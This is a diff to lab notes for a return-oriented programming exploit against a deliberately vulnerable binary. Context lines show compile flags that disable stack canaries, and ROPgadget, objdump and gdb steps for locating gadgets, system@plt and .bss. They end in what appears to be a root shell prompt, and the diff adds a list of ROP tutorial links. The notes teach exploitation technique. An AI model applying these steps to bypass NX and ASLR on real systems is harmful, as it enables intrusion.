@@ -27,7 +27,7 @@ Software used:
 	Kali Linux x86 v2016.1
 	ROPgadget v5.4 (pip install ROPgadget)
 	gcc v3.5.1
-	
+
 Protection:
 	NX on by default in gcc version 5.3.1
 	ASLR on by default in Kali Linux 2016.1
@@ -36,7 +36,7 @@ Compile with:
 	gcc -g -fno-stack-protector -mpreferred-stack-boundary=2 -o vuln vuln.c
 		*default value of 4 for stack boundary option breaks this implementation
 		*stack canaries (or stack protectors) break this implementation
-	
+
 Look for pop|pop|ret:
 	ROPgadget --binary vuln --only "pop|ret"
 	0x080484ba : pop edi ; pop ebp ; ret
@@ -46,7 +46,7 @@ Look for system@plt and strcpy@plt:
 	disas main
 	0x08048449 <+46>:    call   0x80482f0 <system@plt>
 	0x0804843a <+31>:    call   0x80482e0 <strcpy@plt>
-	
+
 Look for address of bss:
 	objdump -x vuln | grep bss
 	080496f0 l    d  .bss	00000000              .bss
@@ -173,4 +173,9 @@ Use gdb to examine the stack before and after payload is written
 	
 	# echo "ROP ftw!"
 
-	
+Resources:
+	http://www.slideshare.net/saumilshah/dive-into-rop-a-quick-introduction-to-return-oriented-programming
+	https://www.exploit-db.com/docs/28479.pdf
+	https://github.com/DSUcoder/CSC-840/blob/master/Cycle05/ROP.pdf
+	https://www.trustwave.com/Resources/SpiderLabs-Blog/Baby-s-first-NX-ASLR-bypass/
+
